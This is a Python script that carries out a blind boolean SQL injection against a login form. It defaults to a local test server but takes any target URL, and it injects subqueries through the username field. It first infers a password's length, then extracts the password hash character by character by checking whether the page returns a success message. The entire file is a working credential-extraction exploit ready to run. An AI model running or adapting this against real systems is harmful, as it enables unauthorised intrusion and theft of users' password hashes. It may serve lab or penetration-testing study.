import requests
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger()

# Global Variables
total_queries = 0
charset = "0123456789abcdef"
target = None
needle = None

# Functions
def set_target_and_needle():
    global target, needle
    target = input("Enter the target URL (default: http://127.0.0.1:5000): ").strip() or "http://127.0.0.1:5000"
    needle = input("Enter the response substring to detect success (default: 'Welcome back'): ").strip() or "Welcome back"
    logger.info(f"Target set to: {target}")
    logger.info(f"Success needle set to: '{needle}'")

def injected_query(payload):
    global total_queries
    total_queries += 1
    try:
        response = requests.post(target, data={"username": f"admin and {payload}--", "password": "password"})
        return needle.encode() not in response.content
    except requests.RequestException as e:
        logger.error(f"Request failed: {e}")
        return False

def boolean_query(offset, user_id, character, operator=">"):
    payload = f"(select hex(substr(password, {offset + 1}, 1)) from user where id = {user_id}) {operator} hex('{character}')"
    return injected_query(payload)

def invalid_user(user_id):
    payload = f"(select id from user where id = {user_id}) >= 0"
    return injected_query(payload)

def password_length(user_id):
    i = 0
    while True:
        payload = f"(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)"
        if not injected_query(payload):
            return i
        i += 1

def extract_hash(user_charset, user_id, pwd_length):
    found = ""
    for i in range(pwd_length):
        for char in user_charset:
            logger.debug(f"Testing character '{char}' at position {i + 1}")
            if boolean_query(i, user_id, char):
                found += char
                logger.info(f"Found character: {char}")
                break
    return found

def total_queries_taken():
    global total_queries
    logger.info(f"Total queries executed: {total_queries}")
    total_queries = 0

def main():
    global charset
    set_target_and_needle()
    charset_input = input(f"Enter charset to use (default: {charset}): ").strip()
    if charset_input:
        charset = charset_input
        logger.info(f"Charset set to: {charset}")

    while True:
        try:
            user_id = input("Enter a user ID to extract the password hash: ").strip()
            if not user_id.isdigit():
                logger.error("User ID must be a number.")
                continue

            if not invalid_user(user_id):
                start_time = time.time()
                pwd_length = password_length(user_id)
                logger.info(f"User {user_id} password length: {pwd_length}")
                total_queries_taken()

                password_hash = extract_hash(charset, int(user_id), pwd_length)
                end_time = time.time()
                logger.info(f"User {user_id} password hash: {password_hash}")
                logger.info(f"Time taken: {end_time - start_time:.2f} seconds")
                total_queries_taken()
            else:
                logger.warning(f"User {user_id} does not exist!")

        except KeyboardInterrupt:
            logger.info("Exiting program...")
            break

# Run the program
if __name__ == "__main__":
    main()
